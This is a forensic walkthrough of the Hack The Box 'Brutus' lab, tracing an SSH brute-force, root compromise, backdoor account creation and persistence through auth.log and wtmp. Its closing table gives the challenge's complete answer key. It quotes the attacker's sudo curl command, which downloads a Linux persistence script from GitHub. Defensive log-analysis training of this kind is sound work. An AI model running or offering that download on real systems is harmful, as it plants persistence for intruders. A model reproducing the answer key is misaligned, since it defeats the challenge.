# HTB Sherlock: Brutus

## Case Study: Brutus Unix Log Analysis

**Target Service:** SSH on Confluence Server

## Mission Objective
The goal of this investigation was to analyze a Confluence server that was brute-forced via its SSH service. By examining the **auth.log** and **wtmp** artifacts, I aimed to track the attacker's journey from automated credential harvesting to manual access, identify the account compromised, and document post-exploitation activities including privilege escalation and persistence.

---

### **⚠️ Disclaimer & Technical Setup**
**Legal Notice:** This investigation was conducted for educational purposes within a controlled legal environment. 
**Technical Stack:** To ensure forensic integrity, I utilized a **Kali Linux** environment to parse and correlate system artifacts including `auth.log` and the `wtmp` binary log.

---

## Phase 1: Attack Vector & IP Identification
The initial investigation focused on `auth.log` to identify the source of the brute force activity. A high volume of failed attempts was observed originating from a specific external address.

1.  **Log Analysis:** Inspected the `auth.log` for high-frequency "Failed password" entries.
2.  **Discovery:** It was clearly seen that the **65.2.161.68** IP was responsible for the automated brute force attack.

![Task 1 Question](content/assets/htb_brutus/Screenshot%202026-04-18%20104032.png)
![Analyzing initial auth.log entries](content/assets/htb_brutus/analyzing-auth-log.png)

---

## Phase 2: Credential Compromise & Account Identification
Following the automated noise, the logs showed a successful entry. The brute force attempts were successful, and the attacker gained access to a specific system account.

![Task 2 Question](content/assets/htb_brutus/brute-force-source-ip.png)
![Failed login frequency](content/assets/htb_brutus/failed-login-frequency.png)

---

## Phase 3: Timeline & Terminal Session Analysis
To establish a precise timeline, I analyzed the **wtmp** artifact. Unlike authentication logs, this artifact provides visibility into the actual terminal session establishment. I used **utmp.py** to parse the wtmp file. My timezone is set to UTC +04 so I had to convert the timestamp to UTC.

* **Manual Login Timestamp:** `2024-03-06 06:32:45` (UTC).

![Task 3 Question](content/assets/htb_brutus/manual-login-identification.png)
![Timestamp data extraction](content/assets/htb_brutus/timestamp-data-extraction.png)
![Verifying the manual terminal session](content/assets/htb_brutus/verifying-manual-session.png)

---

## Phase 4: SSH Session Correlation
SSH login sessions are assigned a specific session number upon login. By correlating the `auth.log` with the `wtmp` timestamp, I successfully identified the session number assigned to the attacker's activity for the compromised account.

* **Identified Session ID:** `37`

![Task 4 Question](content/assets/htb_brutus/normalized-timeline.png)
![Correlating activity with Session ID 37](content/assets/htb_brutus/correlating-activity-id-37.png)

---

## Phase 5: Persistence & Privilege Escalation
After gaining access, the attacker executed a persistence strategy by creating a new user account with elevated privileges. This activity was mapped to the **MITRE ATT&CK** framework to identify the specific sub-technique used for persistence.

![Task 5 Question](content/assets/htb_brutus/detailed-session-metadata.png)
![User created](content/assets/htb_brutus/Screenshot%202026-04-18%20112530.png)
![Task 6 Question](content/assets/htb_brutus/Screenshot%202026-04-18%20112622.png)
![Identifying the persistence technique](content/assets/htb_brutus/identifying-persistence.png)
![Mapping to MITRE ATT&CK](content/assets/htb_brutus/mapping-mitre-attack.png)

---

## Phase 6: Command Execution & Session Termination
The attacker utilized their backdoor account and higher privileges to download a script. The investigation concluded by identifying the full `sudo` command executed and the exact time the first SSH session ended.

![Task 7 Question](content/assets/htb_brutus/privilege-escalation-traces.png)
![Persistence mechanism identification](content/assets/htb_brutus/persistence-mechanism.png)
![Task 8 Question](content/assets/htb_brutus/sudo-command-execution.png)
![Sudo command execution visibility](content/assets/htb_brutus/final-forensic-artifact.png)

---

## Final Intelligence Report (Q&A)

| # | Question | Answer |
| :--- | :--- | :--- |
| **1** | **Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?** | `65.2.161.68` |
| **2** | **The brute force attempts were successful and attacker gained access to an account on the server. What is the username of the account?** | `root` |
| **3** | **Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives.** | `2024-03-06 06:32:45` |
| **4** | **What is the session number assigned to the attacker's session for the user account from Question 2?** | `37` |
| **5** | **The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?** | `cyberjunkie` |
| **6** | **What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?** | `T1136.001` |
| **7** | **What time did the attacker's first SSH session end according to auth.log?** | `2024-03-06 06:37:24` |
| **8** | **The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?** | `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` |

---
**Mission Outcome:** Full digital forensic profile of the compromise reconstructed; persistence mechanisms identified and mapped to industry frameworks.